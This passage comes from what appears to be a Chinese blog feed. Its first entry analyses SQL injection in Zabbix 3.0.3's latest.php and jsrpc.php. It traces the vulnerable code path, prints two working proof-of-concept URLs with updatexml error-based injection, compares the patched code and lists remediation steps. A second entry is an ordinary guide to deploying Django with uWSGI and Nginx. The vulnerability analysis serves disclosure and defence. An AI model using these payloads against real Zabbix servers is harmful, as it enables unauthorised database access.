<p>PoC:<br>需要在登陆的时候抓包取得sid，或者从登陆后的页面源码中取得sid(仅3.0.x适用)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../zabbix/latest.php?output=ajax&amp;sid=b5ddf30e6b2e5899&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=6666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23</div></pre></td></tr></table></figure></p>
<h4 id="3-2-补丁对比"><a href="#3-2-补丁对比" class="headerlink" title="3.2 补丁对比"></a>3.2 补丁对比</h4><p>zabbix 最新版3.0.4中，删除了<code>latest.php</code>从外部获取<code>toggle_ids</code>的代码，没有了可控的参数，这个点已经<code>无法注入</code></p>
<p>同时修复了<code>CProfile::insertDB()</code>的缺陷，增加了对<code>$idx2</code>的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.3 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，未进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; $idx2</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.4 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，使用zbx_dbstr()进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; zbx_dbstr($idx2)</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="4-jsrpc-php页面漏洞触发分析"><a href="#4-jsrpc-php页面漏洞触发分析" class="headerlink" title="4. jsrpc.php页面漏洞触发分析"></a>4. jsrpc.php页面漏洞触发分析</h3><h4 id="4-1-漏洞代码分析"><a href="#4-1-漏洞代码分析" class="headerlink" title="4.1 漏洞代码分析"></a>4.1 漏洞代码分析</h4><p><code>jsrpc.php</code>中180行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">......</div><div class="line"><span class="keyword">if</span> ($requestType == PAGE_TYPE_JSON) &#123;</div><div class="line">	$http_request = <span class="keyword">new</span> CHttpRequest();</div><div class="line">	$json = <span class="keyword">new</span> CJson();</div><div class="line">	$data = $json-&gt;decode($http_request-&gt;body(), <span class="keyword">true</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	<span class="comment">//关键点，获取输入参数</span></div><div class="line">	$data = $_REQUEST;</div><div class="line">&#125;</div><div class="line">......</div><div class="line"><span class="keyword">if</span> (!is_array($data) || !<span class="keyword">isset</span>($data[<span class="string">'method'</span>])</div><div class="line">		|| ($requestType == PAGE_TYPE_JSON &amp;&amp; (!<span class="keyword">isset</span>($data[<span class="string">'params'</span>]) || !is_array($data[<span class="string">'params'</span>])))) &#123;</div><div class="line">	fatal_error(<span class="string">'Wrong RPC call to JS RPC!'</span>);</div><div class="line">&#125;</div><div class="line">......</div><div class="line"><span class="keyword">switch</span> ($data[<span class="string">'method'</span>]) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="string">'host.get'</span>:</div><div class="line">	......</div><div class="line">	<span class="keyword">case</span> <span class="string">'message.mute'</span>:</div><div class="line">	.......</div><div class="line">	<span class="keyword">case</span> <span class="string">'screen.get'</span>:</div><div class="line">		$result = <span class="string">''</span>;</div><div class="line">		<span class="comment">//关键点</span></div><div class="line">		$screenBase = CScreenBuilder::getScreen($data);</div><div class="line">		<span class="keyword">if</span> ($screenBase !== <span class="keyword">null</span>) &#123;</div><div class="line">			$screen = $screenBase-&gt;get();</div><div class="line"></div><div class="line">			<span class="keyword">if</span> ($data[<span class="string">'mode'</span>] == SCREEN_MODE_JS) &#123;</div><div class="line">				$result = $screen;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span> &#123;</div><div class="line">				<span class="keyword">if</span> (is_object($screen)) &#123;</div><div class="line">					$result = $screen-&gt;toString();</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	......</div><div class="line">	&#125;</div><div class="line">......</div></pre></td></tr></table></figure></p>
<p><strong><code>$data</code>获得所有传入参数，可控</strong>   </p>
<p><code>type</code>必须传入，且不能为常量<code>PAGE_TYPE_JSON</code>(6)，<code>defines.inc.php</code>中定义常量   </p>
<p>当<code>method</code>赋值为<code>screen.get</code>，调用<code>CScreenBuilder::getScreen($data)</code>，跟进到<code>CScreenBuilder.php</code>中171行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getScreen</span><span class="params">(array $options = [])</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">if</span> ($options[<span class="string">'resourcetype'</span>] === <span class="keyword">null</span>) &#123;</div><div class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">			&#125;</div><div class="line">	<span class="keyword">switch</span> ($options[<span class="string">'resourcetype'</span>]) &#123;</div><div class="line">		<span class="keyword">case</span> SCREEN_RESOURCE_GRAPH:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">new</span> CScreenGraph($options);</div><div class="line">		......</div><div class="line">		<span class="keyword">case</span> SCREEN_RESOURCE_DISCOVERY:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">new</span> CScreenDiscovery($options);</div><div class="line">		<span class="keyword">default</span>:</div><div class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>提交参数时如果设置<code>resourcetype</code>，然后一系列可能的返回都是一个继承自<code>CScreenBase</code>的实例，以resourcetype=17为例，CScreenHostTriggers无自己的构造方法，实例化的时候将执行父类CScreenBase的构造方法.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CScreenHostTriggers</span> <span class="keyword">extends</span> <span class="title">CScreenBase</span> </span>&#123;.....&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CScreenHistory</span> <span class="keyword">extends</span> <span class="title">CScreenBase</span> </span>&#123;......)</div></pre></td></tr></table></figure></p>
<p>跟进到<code>CScreenBase.php</code>中的构造方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $options = [])</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="comment">// Get resourcetype.</span></div><div class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;resourcetype === <span class="keyword">null</span> &amp;&amp; array_key_exists(<span class="string">'resourcetype'</span>,<span class="keyword">$this</span>-&gt;screenitem)) &#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;resourcetype = <span class="keyword">$this</span>-&gt;screenitem[<span class="string">'resourcetype'</span>];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;parameters <span class="keyword">as</span> $pname =&gt; $default_value) &#123;</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;required_parameters[$pname]) &#123;</div><div class="line">			<span class="keyword">$this</span>-&gt;$pname = array_key_exists($pname, $options) ? $options[$pname] : $default_value;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Get page file.</span></div><div class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;required_parameters[<span class="string">'pageFile'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;pageFile === <span class="keyword">null</span>) &#123;</div><div class="line">		<span class="keyword">global</span> $page;</div><div class="line">		<span class="keyword">$this</span>-&gt;pageFile = $page[<span class="string">'file'</span>];</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Calculate timeline.</span></div><div class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;required_parameters[<span class="string">'timeline'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;timeline === <span class="keyword">null</span>) &#123;</div><div class="line">		<span class="comment">//关键函数调用calculateTime()</span></div><div class="line">		<span class="keyword">$this</span>-&gt;timeline = <span class="keyword">$this</span>-&gt;calculateTime([</div><div class="line">			<span class="string">'profileIdx'</span> =&gt; <span class="keyword">$this</span>-&gt;profileIdx,</div><div class="line">			<span class="comment">//关键参数</span></div><div class="line">			<span class="string">'profileIdx2'</span> =&gt; <span class="keyword">$this</span>-&gt;profileIdx2,</div><div class="line">			<span class="string">'updateProfile'</span> =&gt; <span class="keyword">$this</span>-&gt;updateProfile,</div><div class="line">			<span class="string">'period'</span> =&gt; array_key_exists(<span class="string">'period'</span>, $options) ? $options[<span class="string">'period'</span>] : <span class="keyword">null</span>,</div><div class="line">			<span class="string">'stime'</span> =&gt; array_key_exists(<span class="string">'stime'</span>, $options) ? $options[<span class="string">'stime'</span>] : <span class="keyword">null</span></div><div class="line">		]);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如果传入<code>profileIdx2</code>参数，它将未经任何过滤地传给<code>CScreenBase::calculateTime()</code>，跟进到<code>CScreenBase.php</code>中425行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">calculateTime</span><span class="params">(array $options = [])</span> </span>&#123;</div><div class="line">......</div><div class="line"><span class="keyword">if</span> ($options[<span class="string">'updateProfile'</span>] &amp;&amp; !<span class="keyword">empty</span>($options[<span class="string">'profileIdx'</span>])) &#123;</div><div class="line">		<span class="comment">//关键点</span></div><div class="line">		CProfile::update($options[<span class="string">'profileIdx'</span>].<span class="string">'.period'</span>, $options[<span class="string">'period'</span>], PROFILE_TYPE_INT, $options[<span class="string">'profileIdx2'</span>]);</div><div class="line">			&#125;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>发现<code>CProfile::update()</code>被调用，且<code>$options[&#39;profileIdx2&#39;]</code>为第4个参数，即形参<code>$idx2</code>。如果再<code>insertDB()</code>被调用时，<code>profileIdx2</code>参数被带进最终执行语句.   </p>
<p>返回到<code>jsrpc.php</code>中调用<code>CScreenBuilder::getScreen($data)</code>后的部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$screenBase = CScreenBuilder::getScreen($data);</div><div class="line"><span class="keyword">if</span> ($screenBase !== <span class="keyword">null</span>) &#123;</div><div class="line">	$screen = $screenBase-&gt;get();</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ($data[<span class="string">'mode'</span>] == SCREEN_MODE_JS) &#123;</div><div class="line">		$result = $screen;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> (is_object($screen)) &#123;</div><div class="line">			$result = $screen-&gt;toString();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>$screenBase</code>不能为null意味着必须设置<code>resourcetype</code>参数<br>要使参数提交结果返回，需要设置<code>mode</code>参数不为3或者不设置   </p>
<p><code>jsrpc.php</code>末尾包含进<code>page_footer.php</code>，最终调用缺陷函数<code>CProfile::insertDB()</code>，<code>profileIdx2</code>参数被执行，产生注入.   </p>
<p>总结调用流程：<br><code>$data = $_REQUEST   ---&gt;    CScreenBuilder::getScreen()   ---&gt;    CScreenBase::__construct()   ---&gt;    CScreenBase::calculateTime()   ---&gt;   CProfile::update()   ---&gt;   CScreenBase::get()   ---&gt;   require_once()   ---&gt;   CProfile::flush()   ---&gt;   CProfile::insertDB()   ---&gt;   CProfile::DBexecute()</code>   </p>
<p>PoC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../zabbix/jsrpc.php?type=9&amp;method=screen.get&amp;profileIdx=1&amp;updateProfile=1&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=1&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&amp;resourcetype=16&amp;profileIdx2=666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23</div></pre></td></tr></table></figure></p>
<h4 id="4-2-补丁对比"><a href="#4-2-补丁对比" class="headerlink" title="4.2 补丁对比"></a>4.2 补丁对比</h4><p>zabbix 最新版3.0.4中，没有对<code>jsrpc.php</code>页面进行任何改动，仍然能传入任意参数。但是修复了<code>CProfile::insertDB()</code>的缺陷，增加了对<code>$idx2</code>的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.3 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，未进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; $idx2</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// zabbix 3.0.4 CProfile.php 277行</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，使用zbx_dbstr()进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; zbx_dbstr($idx2)</div><div class="line">	];</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="5-修复意见"><a href="#5-修复意见" class="headerlink" title="5. 修复意见"></a>5. 修复意见</h3><ol>
<li>更新到最新3.0.4版本，补丁详情：<a href="https://support.zabbix.com/browse/ZBX-11023" target="_blank" rel="external">https://support.zabbix.com/browse/ZBX-11023</a></li>
<li>禁用guest登陆功能</li>
<li>修改管理员账户默认密码</li>
</ol>
<h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><ul>
<li><a href="https://www.seebug.org/vuldb/ssvid-92301" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-92301</a></li>
<li><a href="https://www.seebug.org/vuldb/ssvid-92302" target="_blank" rel="external">https://www.seebug.org/vuldb/ssvid-92302</a></li>
<li><a href="https://support.zabbix.com/browse/ZBX-11023" target="_blank" rel="external">https://support.zabbix.com/browse/ZBX-11023</a></li>
<li><a href="https://packetstormsecurity.com/files/138312" target="_blank" rel="external">https://packetstormsecurity.com/files/138312</a></li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用uWSGI和Nginx部署Django]]></title>
      <url>http://yoursite.com/2016/08/05/deployDjango_Nginx_uWSGI/</url>
      <content type="html"><![CDATA[<p>如何使用uWSGI和Nginx将Django应用部署到生产环境中，本文对此做了较详细的记录，一切过程经过亲自操作.</p>
<a id="more"></a>
<h2 id="使用uWSGI和Nginx部署Django"><a href="#使用uWSGI和Nginx部署Django" class="headerlink" title="使用uWSGI和Nginx部署Django"></a>使用uWSGI和Nginx部署Django</h2><hr>
<h3 id="0x00-何为WSGI、uwsgi、uWSGI"><a href="#0x00-何为WSGI、uwsgi、uWSGI" class="headerlink" title="0x00 何为WSGI、uwsgi、uWSGI?"></a>0x00 何为WSGI、uwsgi、uWSGI?</h3><ul>
<li><a href="http://www.nowamagic.net/academy/detail/1330310" target="_blank" rel="external">WSGI</a>是一种Web服务器网关接口<code>协议</code>，是基于现存的 CGI 标准而设计的。它是一个Web服务器（如Nginx）与应用服务器（如uWSGI服务器）通信的一种规范，即它是一种通信协议。<br><br> </li>
<li><a href="http://uwsgi-docs.readthedocs.io/en/latest/Protocol.html" target="_blank" rel="external">uwsgi</a>是一个uWSGI服务器自有的<code>协议</code>，它用于定义传输信息的类型（type of information），每一个uwsgi packet前4byte为传输信息类型描述，它与WSGI相比是两样东西，但都是通信协议。<br><br> </li>
<li><a href="http://flask.pocoo.org/docs/0.10/deploying/uwsgi/" target="_blank" rel="external">uWSGI</a>是一个<code>Web服务器</code>，它实现了WSGI、uwsgi、FastCGI、HTTP等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。</li>
</ul>
<h3 id="0x01-何为Nginx"><a href="#0x01-何为Nginx" class="headerlink" title="0x01 何为Nginx?"></a>0x01 何为Nginx?</h3><ul>
<li><a href="https://zh.wikipedia.org/wiki/Nginx" target="_blank" rel="external">Nginx</a>是一款面向性能设计的<code>轻量级HTTP服务器</code>，它能反向代理HTTP,HTTPS, SMTP, POP3,IMAP的协议链接，以及提供一个负载均衡器和一个HTTP缓存。<br><br></li>
<li>相较于Apache、lighttpd具有<code>占有内存少</code>，<code>稳定性高</code>等<a href="http://lnmp.org/nginx.html" target="_blank" rel="external">优势</a>。<br><br> </li>
<li>它不采用每客户机一线程的设计模型，而是充分使用异步逻辑，削减了上下文调度开销，所以<code>并发服务能力更强</code>。</li>
</ul>
<hr>
<h3 id="0x02-为什么有了uWSGI为什么还需要Nginx？"><a href="#0x02-为什么有了uWSGI为什么还需要Nginx？" class="headerlink" title="0x02 为什么有了uWSGI为什么还需要Nginx？"></a>0x02 为什么有了uWSGI为什么还需要Nginx？</h3><ul>
<li>相对来说，Nginx具备优秀的<code>静态内容处理能力</code>，因而更加适合取处理静态文件，如css、javascript、png、html等。<br><br> </li>
<li>而<code>动态的文件</code>最好由Nginx转交给uWSGI去进行处理，这样可以达到很好的客户端响应。<br><br> </li>
<li>基础页面输出的模型：<blockquote>
<p>英文描述：<code>web client &lt;-&gt; web server &lt;-&gt; socket &lt;-&gt; uwsgi &lt;-&gt; Django</code><br>中文描述：<code>网页客户端&lt;-&gt;网页服务器&lt;-&gt;网络套接字&lt;-&gt;uwsgi&lt;-&gt; Django应用</code></p>
</blockquote>
</li>
</ul>
<hr>
<h3 id="0x03-环境准备"><a href="#0x03-环境准备" class="headerlink" title="0x03 环境准备"></a>0x03 环境准备</h3><p>服务器:ubuntu,拥有root权限  </p>
<p><code>sudo apt-get update</code></p>
<p>Nginx安装:  </p>
<p><code>sudo apt-get install nginx</code></p>
<p>uWSGI安装:  </p>
<p><code>sudo apt-get install python2.7-dev</code><br><code>sudo pip install uwsgi</code>  </p>
<p>Django安装:  </p>
<p><code>sudo pip install django==1.6.1</code>（此处填入要安装的Django版本）<br>有时候下载非常缓慢或者无法连接，可以尝试使用豆瓣源:<br><code>sudo pip install django==1.6.1 -i http://pypi.douban.com/simple</code></p>
<p>Mysql安装：</p>
<p><code>sudo apt-get install mysql-server</code><br>如果是已经安装好，却忘记root密码，如下找回:</p>
<blockquote>
<ol>
<li>修改MySQL的登录设置：<code>sudo vim /etc/mysql/my.cnf</code></li>
<li>在[mysqld]的段末尾加上一句：<code>skip-grant-tables</code>，保存并退出</li>
<li>重新启动mysqld ：<code>sudo /etc/init.d/mysqld restart</code>  ( sudo service mysql restart )</li>
<li>登录并修改MySQL的root密码:<code>mysql</code> -&gt; <code>USE mysql</code> -&gt; <code>UPDATE user SET Password = password ( &#39;new-password&#39; ) WHERE User = &#39;root&#39;;</code></li>
<li>将刚才在[mysqld]的段中加上的skip-grant-tables删除 </li>
<li>重新启动mysqld.</li>
</ol>
</blockquote>
<hr>
<h3 id="0x04-Django应用设置"><a href="#0x04-Django应用设置" class="headerlink" title="0x04 Django应用设置"></a>0x04 Django应用设置</h3><p>以本次部署使用的wslcore.tar.gz为例，解压到/home/wsl/下：  </p>
<p><code>tar zxvf wslcore.tar.gz -C /home/wsl/</code><br><code>cd /home/wsl/wslcore/</code></p>
<h4 id="设置连接Mysql数据库信息"><a href="#设置连接Mysql数据库信息" class="headerlink" title="设置连接Mysql数据库信息:"></a>设置连接Mysql数据库信息:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># wslcore/settings/common.py</div><div class="line"># 特别提醒，数据库用户密码必须为非空，否则无法连接</div><div class="line">DATABASES = &#123;</div><div class="line">    &apos;default&apos;: &#123;</div><div class="line">       &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,</div><div class="line">       &apos;NAME&apos;: &apos;wslcore&apos;, #数据库名称</div><div class="line">       &apos;USER&apos;: &apos;root&apos;,</div><div class="line">       &apos;PASSWORD&apos;: &apos;YOUR_PASSWORD&apos;,</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="同步数据库"><a href="#同步数据库" class="headerlink" title="同步数据库:"></a>同步数据库:</h4><ol>
<li>必须先在数据库内创建数据库:  </li>
</ol>
<ul>
<li><code>mysql -u root -p</code>  </li>
<li><code>set names utf8</code></li>
<li><code>CREATE DATABASE wslcore CHARACTER SET &#39;utf8&#39; COLLATE &#39;utf8_general_ci&#39;;</code><br>(特别提醒，本例中使用Django1.6.1版本时的syncdb同步功能，不会自动设置数据库及其内表的编码格式，所以手动创建数据库的时必须生声明编码格式。如果是高版本，则可能可以不用这样声明，只需简单建库即可)</li>
<li><code>exit</code>  </li>
</ul>
<ol>
<li>同步:</li>
</ol>
<ul>
<li><code>python manage.py syncdb</code></li>
<li>对于1.7.0以上版本使用<br><code>python manage.py makemigrations</code><br><code>python manage.py migrate</code></li>
</ul>
<h4 id="配置定时任务"><a href="#配置定时任务" class="headerlink" title="配置定时任务:"></a>配置定时任务:</h4><ol>
<li>题外话，扩展manage.py功能：</li>
</ol>
<ul>
<li>在django包目录<code>/usr/local/lib/python2.7/dist-packages/django/core/management/commands</code>中添加如下文件<code>mycommand.py</code>，就可以使用<code>python manage.py mycommand</code>执行handle()中的代码。</li>
<li>参考:<a href="http://www.cnblogs.com/linjiqin/p/3965046.html" target="_blank" rel="external">http://www.cnblogs.com/linjiqin/p/3965046.html</a>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from django.core.management.base import BaseCommand   </div><div class="line">class Command(BaseCommand):</div><div class="line">    def handle(self, *args, **options):         </div><div class="line">        print &quot;hello world&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<ol>
<li>使用django-crontab插件：</li>
</ol>
<ul>
<li><code>sudo pip install django-crontab</code>  (import时候名字为django_crontab)  </li>
<li>将django_crontab加入到settings.py的INSTALLED_APPS即可，例如：<br>INSTALLED_APPS = (<br>……，<br>‘django_crontab’,<br>……，)</li>
<li>配置调用时间和调用函数，例如<br>CRONJOBS = [<br>  (‘<em>/60 </em> <em> </em> *’, ‘wslcore.apps.pocdb.crawl.crawl_exploitdb’,), ]<br>表示每隔60分钟，调用项目中pocdb文件夹下crawl.py文件中的crawl_exploitdb()函数</li>
<li>任务加载或结束<br><code>python manage.py crontab add</code>即可加载任务<br><code>python manage.py crontab remove</code> 即可移除任务<br>可以用<code>crontab -u SYSTEM_USERNAME -l</code>查看当前任务<br>可以用<code>crontab -u SYSTEM_USERNAME -r</code>结束当前任务</li>
<li>参考：<br><a href="https://github.com/kraiz/django-crontab" target="_blank" rel="external">官方说明及详细定时规则</a><br><a href="http://www.zhidaow.com/post/django-crontab" target="_blank" rel="external">django-crontab实现Django定时任务</a><br><a href="http://my-first-read-the-docs.readthedocs.io/en/latest/django_crontab.html" target="_blank" rel="external">利用django-crontab来部署系统cron jobs</a></li>
</ul>
<hr>
